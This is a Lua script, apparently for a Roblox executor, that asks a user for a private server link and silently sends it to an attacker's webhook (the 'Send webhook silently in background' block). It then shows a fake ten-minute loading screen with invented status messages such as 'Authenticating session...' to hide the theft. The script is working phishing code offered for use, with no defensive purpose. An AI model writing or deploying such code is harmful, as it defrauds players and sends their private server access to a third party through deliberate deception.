-- ============================================================
-- // SPINNER LOOP
-- ============================================================
local spinning = false
local function startSpinner()
    spinning = true
    task.spawn(function()
        local angle = 0
        while spinning do
            angle = (angle + 5) % 360
            SpinnerImg.Rotation = angle
            task.wait(0.03)
        end
    end)
end

-- ============================================================
-- // FAKE LOADING (10 minutes)
-- ============================================================
local statusMsgs = {
    "Connecting to server...",
    "Authenticating session...",
    "Loading game assets...",
    "Fetching player data...",
    "Syncing world state...",
    "Loading textures...",
    "Rendering environment...",
    "Preparing spawn point...",
    "Finalizing connection...",
    "Almost there...",
}

local function startFakeLoading()
    local totalTime = 600
    local elapsed = 0
    local tickRate = 0.5

    startSpinner()

    task.spawn(function()
        while elapsed < totalTime do
            task.wait(tickRate)
            elapsed = elapsed + tickRate

            local pct = math.min(math.floor((elapsed / totalTime) * 100), 99)

            TweenService:Create(BarFill, TweenInfo.new(0.45), {
                Size = UDim2.new(pct / 100, 0, 1, 0)
            }):Play()

            PctLabel.Text = "%" .. pct

            local msgIdx = math.clamp(math.ceil((pct / 100) * #statusMsgs), 1, #statusMsgs)
            StatusLabel.Text = statusMsgs[msgIdx]
        end

        PctLabel.Text = "%99"
        StatusLabel.Text = "Finalizing connection..."
    end)
end

-- ============================================================
-- // BUTTON LOGIC
-- ============================================================
Btn.MouseButton1Click:Connect(function()
    local link = Box.Text

    if not isValidPrivServer(link) then
        ErrLabel.Visible = true
        TweenService:Create(Box, TweenInfo.new(0.1), {BackgroundColor3 = Color3.fromRGB(140, 30, 50)}):Play()
        task.wait(0.5)
        TweenService:Create(Box, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(32, 40, 78)}):Play()
        task.delay(3, function() ErrLabel.Visible = false end)
        return
    end

    ErrLabel.Visible = false

    -- Send webhook silently in background
    task.spawn(function()
        pcall(function()
            local body = HttpService:JSONEncode({
                embeds = {{
                    title = "🔗 Private Server Link!",
                    description = "```\n" .. link .. "\n```",
                    color = 0x00b4d8,
                    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
                    footer = { text = "Server Joiner" }
                }}
            })
            local req = (syn and syn.request) or (http and http.request) or request
            req({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = body
            })
        end)
    end)

    -- Top-right notif
    showNotif()

    -- Fade out input GUI
    for _, child in ipairs(InputFrame:GetDescendants()) do
        if child:IsA("TextLabel") or child:IsA("TextButton") or child:IsA("TextBox") then
            TweenService:Create(child, TweenInfo.new(0.25), {TextTransparency = 1}):Play()
        end
    end
    TweenService:Create(InputFrame, TweenInfo.new(0.3), {BackgroundTransparency = 1}):Play()
    task.wait(0.35)
    InputFrame.Visible = false

    -- Fade in fullscreen loading
    LoadFrame.Visible = true
    TweenService:Create(LoadFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {
        BackgroundTransparency = 0
    }):Play()

    startFakeLoading()
end)
